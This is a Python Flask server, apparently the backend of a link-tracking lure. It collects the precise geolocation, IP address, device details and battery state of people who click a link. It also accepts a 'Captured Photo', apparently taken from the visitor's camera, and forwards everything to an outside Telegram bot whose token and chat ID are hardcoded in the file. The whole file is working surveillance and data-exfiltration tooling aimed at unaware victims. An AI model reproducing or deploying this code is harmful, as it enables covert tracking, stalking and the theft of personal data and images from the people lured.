import os
import json
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app, supports_credentials=True, origins="*")  # ✅ Allow all origins

# ✅ Telegram Bot Configuration
BOT_TOKEN = "7155229931:AAH0hS_AyT9waCCLAEmj9xCmpjE0oC9x3KE"
CHAT_ID = "7526005252"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# ✅ Store users who clicked the link
tracked_users = {}

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def send_telegram_message(text):
    """Send text message to Telegram bot."""
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        requests.post(TELEGRAM_API, json=payload)
    except Exception as e:
        print("❌ Error sending message:", str(e))

@app.route('/track/<session_id>', methods=['POST', 'OPTIONS'])
def track_device(session_id):
    """Track multiple users and send data to Telegram."""
    if request.method == "OPTIONS":
        return jsonify({"status": "CORS Preflight OK"}), 200

    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid JSON data"}), 400

        battery = data.get("battery", {})
        geo = data.get("geo", {})
        device = data.get("device", {})

        user_ip = device.get("ip", "Unknown")
        message_status = "🔁 User revisited." if user_ip in tracked_users else "🆕 New User Clicked the Link!"
        tracked_users[user_ip] = session_id  

        message = f"""
<b>{message_status}</b>
📡 <b>Session ID:</b> {session_id}

⚡ <b>Battery:</b> {battery.get("level", "N/A")}% (Charging: {battery.get("charging", "N/A")})
🌍 <b>Geolocation:</b> Lat {geo.get("latitude", "N/A")}, Lon {geo.get("longitude", "N/A")}
📱 <b>Device:</b> {device.get("platform", "N/A")}
💻 <b>Screen:</b> {device.get("screenWidth", "N/A")}x{device.get("screenHeight", "N/A")}
🌐 <b>IP Address:</b> {user_ip}
🖥 <b>User-Agent:</b> {device.get("userAgent", "N/A")}
"""

        send_telegram_message(message)
        return jsonify({"status": "success"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/upload-photo/<session_id>', methods=['POST'])
def upload_photo(session_id):
    """Save uploaded photo and send to Telegram."""
    try:
        if 'photo' not in request.files:
            return jsonify({"error": "No file uploaded"}), 400

        photo = request.files['photo']
        photo_path = os.path.join(UPLOAD_FOLDER, f"{session_id}.jpg")
        photo.save(photo_path)

        with open(photo_path, "rb") as f:
            requests.post(TELEGRAM_PHOTO_API, files={"photo": f}, data={"chat_id": CHAT_ID, "caption": "📷 Captured Photo"})

        os.remove(photo_path)
        return jsonify({"status": "success"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.getenv("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
